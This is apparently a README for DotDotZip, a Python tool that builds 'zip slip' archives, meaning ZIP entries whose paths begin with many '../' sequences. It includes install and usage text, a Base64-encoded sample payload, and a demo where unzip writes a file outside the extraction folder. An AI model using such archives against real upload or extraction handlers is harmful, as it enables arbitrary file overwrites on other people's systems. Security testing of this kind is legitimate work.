After having viewed some interesting content including a [NahamSec video](https://youtu.be/4sKlbMiGWAw) on a little-known technique for hiding path traversals inside ZIP files and hearing that Python can pull that off, I just had to try creating a tool for generating such payloads.

The result, of course, is this: a tool for creating the perfect upload packer.

# Installation

```
pipx install git+https://github.com/kennystrawnmusic/DotDotZip
```

# Usage

```
$ dotdotzip --help
usage: dotdotzip [-h] [--traverse-count TRAVERSE_COUNT] [--zip-name ZIP_NAME]
                 --prepend-path PREPEND_PATH
                 --pack-files PACK_FILES [PACK_FILES ...]

DotDotZip v. 0.2.4

options:
  -h, --help            show this help message and exit
  --traverse-count TRAVERSE_COUNT
                        Number of '../' sequences to prepend
  --zip-name ZIP_NAME   Name of the output ZIP archive (leave blank to output
                        Base64 encoded ZIP to the console)
  --prepend-path PREPEND_PATH
                        Extra path to prepend
  --pack-files PACK_FILES [PACK_FILES ...]
                        Names of files to pack
```

Example (Base64):

```
$ dotdotzip --prepend-path '/Users/realkstrawn93/Desktop' --traverse-count 15 --pack-files pyproject.toml
UEsDBBQAAAAAACqAI13iPK7+KAEAACgBAABXAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vVXNlcnMvcmVhbGtzdHJhd245My9EZXNrdG9wL3B5cHJvamVjdC50b21sW2J1aWxkLXN5c3RlbV0KcmVxdWlyZXMgPSBbInNldHVwdG9vbHM+PTYxLjAuMCJdCmJ1aWxkLWJhY2tlbmQgPSAic2V0dXB0b29scy5idWlsZF9tZXRhIgoKW3Byb2plY3RdCm5hbWUgPSAiZG90ZG90emlwIgp2ZXJzaW9uID0gIjAuMi40IgpkZXNjcmlwdGlvbiA9ICJBIHV0aWxpdHkgZm9yIGdlbmVyYXRpbmcgXCJ6aXAgc2xpcFwiIHBheWxvYWRzIGZvciB0ZXN0aW5nIHppcCBmaWxlIGV4dHJhY3Rpb24gdnVsbmVyYWJpbGl0aWVzLiIKCltwcm9qZWN0LnNjcmlwdHNdCmRvdGRvdHppcCA9ICJkb3Rkb3R6aXA6bWFpbiJQSwECFAMUAAAAAAAqgCNd4jyu/igBAAAoAQAAVwAAAAAAAAAAAAAApIEAAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vVXNlcnMvcmVhbGtzdHJhd245My9EZXNrdG9wL3B5cHJvamVjdC50b21sUEsFBgAAAAABAAEAhQAAAJ0BAAAAAA==
```

Example (filesystem):

```
realkstrawn93@realkstrawn93-m1mbp ~/Downloads/dotdotzip (main*) $ mkdir ~/test 
realkstrawn93@realkstrawn93-m1mbp ~/Downloads/dotdotzip (main*) $ dotdotzip --prepend-path '/Users/realkstrawn93/test' --traverse-count 15 --pack-files pyproject.toml --zip-name test.zip
realkstrawn93@realkstrawn93-m1mbp ~/Downloads/dotdotzip (main*) $ unzip -: test.zip
Archive:  test.zip
 extracting: ../../../../../../../../../../../../../../../Users/realkstrawn93/test/pyproject.toml  
realkstrawn93@realkstrawn93-m1mbp ~/Downloads/dotdotzip (main*) $ ls ~/test
pyproject.toml
realkstrawn93@realkstrawn93-m1mbp ~/Downloads/dotdotzip (main*) $ 
```